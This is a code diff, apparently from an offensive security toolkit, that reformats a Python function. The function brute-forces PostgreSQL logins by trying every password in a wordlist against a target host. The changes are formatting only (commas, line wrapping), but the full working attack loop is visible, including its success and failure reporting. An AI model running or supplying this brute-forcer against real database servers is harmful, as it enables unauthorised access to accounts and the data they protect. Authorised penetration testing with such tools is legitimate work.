@@ -3,12 +3,13 @@ from psycopg2 import OperationalError
 from typing import Optional
 from .utils import clear_line
 
+
 def postgres_bruteforce(
     host: str,
     username: str,
     wordlist_path: str,
     port: int = 5432,
-    dbname: str = "postgres"
+    dbname: str = "postgres",
 ) -> Optional[str]:
     """
     Attempt PostgreSQL brute force attack using a password wordlist.
@@ -26,7 +27,7 @@ def postgres_bruteforce(
     with open(wordlist_path, "r") as f:
         for line in f:
             password = line.strip()
-            
+
             clear_line()
             print(f"[?] Trying password: {password}", end="\r")
             try:
@@ -36,18 +37,23 @@ def postgres_bruteforce(
                     password=password,
                     port=port,
                     dbname=dbname,
-                    connect_timeout=3
+                    connect_timeout=3,
                 )
                 print(f"[+] PostgreSQL login succeeded: {username}:{password}")
                 conn.close()
                 return password
             except OperationalError:
                 clear_line()
-                print(f"[-] PostgreSQL login failed for {username}:{password}", end="\r")
+                print(
+                    f"[-] PostgreSQL login failed for {username}:{password}", end="\r"
+                )
                 continue
             except Exception as e:
                 clear_line()
-                print(f"Connection error or other POSTGRES issues: {e}. Continuing...", end="\r")
+                print(
+                    f"Connection error or other POSTGRES issues: {e}. Continuing...",
+                    end="\r",
+                )
                 continue
     print("[!] No valid password found.")
     return None
